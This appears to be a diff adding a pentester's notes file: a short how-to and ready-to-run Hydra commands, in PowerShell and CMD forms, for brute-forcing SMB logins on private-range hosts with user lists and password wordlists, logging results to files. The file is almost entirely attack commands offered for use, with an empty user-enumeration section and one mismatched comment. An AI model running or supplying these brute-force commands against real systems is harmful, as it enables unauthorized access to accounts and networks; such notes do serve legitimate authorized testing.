@@ -1,0 +1,79 @@
+
+1) cd into the hydra folder 
+
+2) create a list of users 
+
+
+3) Run Hydra 
+
+
+./brute_hydra_password.ps1
+./brute_hydra.ps1
+
+
+####################################
+Enum Users 
+####################################
+
+
+
+
+
+####################################
+Hydra - Powershell 
+####################################
+
+$target="192.168.80.50"
+
+# password 
+hydra.exe -L .\users.txt -P .\pass_password.txt $target smb | Tee C:\windows\temp\hydra_password.txt
+
+# pass5 + blank + user=pass
+hydra.exe -L .\users.txt -P .\pass5.txt -e snr $target smb | Tee C:\windows\temp\hydra_pass5.txt
+
+# pass5 + blank + user=pass
+hydra.exe -L .\users.txt -P .\pass5.txt -e snr $target smb | Tee C:\windows\temp\hydra_pass20.txt
+
+
+
+####################################
+Hydra - CMD 
+####################################
+
+set target=172.16.0.10
+
+hydra.exe -L users.txt -P pass_password.txt %target% smb > hydra_brute.txt
+
+hydra.exe -L users.txt -P pass5.txt -e snr %target% smb >> hydra_brute.txt
+
+hydra.exe -L users.txt -P pass10.txt -e snr %target% smb >> hydra_brute.txt
+
+hydra.exe -L users.txt -P pass100.txt -e snr %target% smb >> hydra_brute.txt
+
+
+
+####################################
+BAT 
+####################################
+
+set "userlist=users.txt"
+set target=172.16.0.10
+
+brute_hydra.bat
+
+
+
+
+
+
+####################################
+Wordlists 
+####################################
+
+./pass_password.txt
+./pass5.txt
+./pass10.txt
+./pass20.txt
+./pass100.txt
+./pass100.txt
+
